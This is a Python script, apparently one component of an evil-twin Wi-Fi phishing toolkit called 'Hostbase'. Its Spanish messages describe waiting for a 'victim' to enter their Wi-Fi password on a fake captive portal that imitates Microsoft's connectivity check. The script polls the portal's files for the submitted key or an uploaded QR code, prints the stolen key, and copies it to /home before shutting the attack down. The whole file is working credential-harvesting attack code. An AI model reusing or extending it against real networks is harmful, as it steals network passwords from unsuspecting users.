import os
import time
import subprocess
import sys
import signal


GREEN = "\033[32m"
CYAN = "\033[36m"
RED = "\033[31m"
RESET = "\033[0m"





print(f"{CYAN}Esperamos a la victima... press CTRL+C una vez para quitar...")
os.system("killall wash")
while True:
    if os.stat("/var/www/cle.txt").st_size >= 8 or os.stat("/var/www/msftconnecttest/cle.txt").st_size >= 8 or len(os.listdir("/var/www/msftconnecttest/qrcode")) > 0:
        break
    time.sleep(2)
else:
    raise ValueError("%s isn't a file!" % file_path)

time.sleep(20) # le temps de laisser l'utilisateur rentrer aussi la confirmation de clé.

print(f"{GREEN}KEY FOUND !")
print('Un usario se ha conectado y ha entrado su clave wifi...')
if os.stat("/var/www/cle.txt").st_size >= 8:
   with open("/var/www/cle.txt", "r") as k:
    key = k.read()
    print(key)
    print(f"{RESET}Guardamos la clave en la carpeta home...")
    os.system('cp -R /var/www/cle.txt /home/')
    print("Done.")
elif len(os.listdir("/var/www/msftconnecttest/qrcode")) > 0:
    print('El usario ha enviado algo en /var/www/msftconnecttest/qrcode')
    print('Usted se tiene que ir en esta carpeta y guardar el codigo QR para conectarse a la red.')
else:
    with open("/var/www/msftconnecttest/cle.txt", "r") as k:
        key = k.read()
        print(key)
        print(f"{RESET}Guardamos la clave en la carpeta home...")
        os.system('cp -R /var/www/msftconnecttest/cle.txt /home/')
        print("Done.")

print(f"{CYAN}Quitando Hostbase...")
exitscript = subprocess.Popen("python exit.py", shell=True)
sys.exit()
# exit de tout les process plus effacemment des fichier txt et csv, restart ne network manager